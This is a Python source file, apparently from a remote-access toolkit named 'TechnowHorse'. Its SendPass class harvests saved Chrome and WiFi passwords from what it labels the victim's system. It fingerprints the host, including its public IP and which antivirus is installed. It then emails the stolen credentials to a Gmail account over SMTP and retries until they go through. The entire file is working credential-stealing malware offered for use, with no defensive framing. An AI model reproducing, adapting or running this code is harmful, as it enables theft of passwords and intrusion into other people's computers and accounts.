import time, smtplib, platform, getpass
import get_chrome_pass, get_wifi_pass  #Self Written Modules
import requests
import os 

class SendPass:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.system_info = self.get_system_info()
        self.log = ""
        
    def get_chrome_browser_creds(self):
        try:
            self.log += "SAVED PASSWORDS OF Chrome Browser FROM VICTIM SYSTEM : \n"
            chrome = get_chrome_pass.GetChromePass()
            self.log += chrome.start()
        except Exception:
            time.sleep(10)
            self.get_chrome_browser_creds()            
        self.send_mail(self.log)
        self.log = ""
        
        
    def get_wifi_creds(self):
        try:
            self.log += "SAVED PASSWORDS OF WiFi FROM VICTIM SYSTEM : \n"
            wifi = get_wifi_pass.GetWifiPassword()
            self.log += wifi.start()
        except Exception:
            time.sleep(10)
            self.get_wifi_creds()         
        self.send_mail(self.log)        
        self.log = ""        

    def get_system_info(self):
        uname = platform.uname()
        operating_system = uname[0] + " " + uname[2] + " " + uname[3]
        computer_name = uname[1]
        user = getpass.getuser()

        # Finding AV
        av = "Unknown"
        if os.path.exists('C:\\Program Files\\Windows Defender'):
            av = 'Windows Defender'
        if os.path.exists('C:\\Program Files\\AVAST Software\\Avast'):
            av = 'Avast'
        if os.path.exists('C:\\Program Files\\AVG\\Antivirus'):
            av = 'AVG'
        if os.path.exists('C:\\Program Files\\Avira\\Launcher'):
            av = 'Avira'
        if os.path.exists('C:\\Program Files\\IObit\\Advanced SystemCare'):
            av = 'Advanced SystemCare'
        if os.path.exists('C:\\Program Files\\Bitdefender Antivirus Free'):
            av = 'Bitdefender'
        if os.path.exists('C:\\Program Files\\COMODO\\COMODO Internet Security'):
            av = 'Comodo'
        if os.path.exists('C:\\Program Files\\DrWeb'):
            av = 'Dr.Web'
        if os.path.exists('C:\\Program Files\\ESET\\ESET Security'):
            av = 'ESET'
        if os.path.exists('C:\\Program Files\\GRIZZLY Antivirus'):
            av = 'Grizzly Pro'
        if os.path.exists('C:\\Program Files\\Kaspersky Lab'):
            av = 'Kaspersky'
        if os.path.exists('C:\\Program Files\\IObit\\IObit Malware Fighter'):
            av = 'Malware fighter'
        if os.path.exists('C:\\Program Files\\360\\Total Security'):
            av = '360 Total Security'  
              
        try:
            IP_Address = requests.get('http://ip.42.pl/raw').text
        except: IP_Address = "Unknown"

        sys_logs =  "Operating System: " + operating_system + "\n"
        sys_logs += "Computer Name:    " + computer_name    + "\n"
        sys_logs += "User:             " + user             + "\n"
        sys_logs += "IP Address:       " + IP_Address       + "\n"
        sys_logs += "Anti Virus:       " + av 

        return sys_logs

    def send_mail(self, message):
        try:
            message = "Subject: TechnowHorse Reporting With Saved Password\n\n" + "Report From:\n\n" + self.system_info + "\n\n" + message
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, message)
            server.quit()
        except Exception as e:
            time.sleep(15)
            self.send_mail(self.log)
    
if __name__ == '__main__':
    email = input("Enter Email Address: ")
    password = input("Enter Email Address: ")    
    test = SendPass(email, password)
    test.get_wifi_creds()
    print("[+] Wifi Password Send Successfully!")
    test.get_chrome_browser_creds()
    print("[+] Chrome Browser Password Send Successfully!")    
    
